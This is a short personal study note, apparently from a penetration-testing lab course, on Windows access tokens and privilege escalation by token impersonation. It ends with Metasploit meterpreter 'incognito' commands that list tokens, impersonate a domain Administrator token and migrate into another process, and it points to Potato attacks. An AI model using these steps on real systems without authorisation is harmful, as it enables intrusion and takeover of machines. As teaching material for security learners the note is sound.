---
title: PrivEsc - Windows - Access Token Impersonation
date: 2024-03-22
description: Windows Privilege Escalation through Access Token Impersonation
tags: #windows #privesc #accesstoken
- 
---

# Windows Access Tokens
Created and managed by the **LSASS*, access tokens are the core element of the authentication process on Windows. They are responsible for **identifying and describing the security context of a process or thread**. They can be seen as a temporary key that provides users with the required access to a system, without having to provide credentials each time a process is started or resources is used.

They are generated by the *winlogon.exe* process every time a user authenticates successfully. This token is then attached to the *userinit.exe* process, after which **all child processes** started by this user will then **inherit a copy of the access token** and will run with the privileges associated with it.

Tokens are categoriezed based on their security levels. They are:
- **Impersonate-level:** Created as a result of non-interactive login, typically through system services or domain logons.
    - Can be used to impersonate a token on the local system and not on any external systems.
- **Delegate-level:** Created through remote access protocols such as RDP.
    - Pose the largest threat since they can be used to impersonate tokens on any system.

# Windows Privileges
The process of impersonating tokens to elevate priveleges will depend on the priveleges assigned to the account that has been exploited to gain initial access as well as the Impersonation/Delegation tokens available.

These are the privileges required for a successfull impersonation attack:
- **SeAssignPrimaryToken:** Allows a user to impersonate tokens.
- **SeCreateToken:** Allows a user to create an arbitrary token with administrative privileges
- **SeImpersonatePrivilege:** Allows a user to create a process under the security context of another user tipically with admin privileges

# Impersonating Tokens
This is an built-in module for metasploit, that allows us to impersonate user tokens after successfull exploitation. We can use it to display a list of all available tokens that we can impersonate.

## Incognito
After establishing a meterpreter session...

```bash
# Load the required module
meterpreter > load incognito

# List all user tokens and impersonate token
meterpreter > list_tokens -u
meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"

# Migrate into another process and confirm privileges
meterpreter > pgrep explorer
meterpreter > migrate <id>
meterpreter > getprivs
```

If no Tokens are available, you might have to look into the Potato Attack, where it might be possible to force the generation of an "NT AUTHORITY\SYSTEM" token and then impersonate it.



## Links:
- [Microsoft Learn - Access Tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- [HackTricks - Access Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens)


202403221903
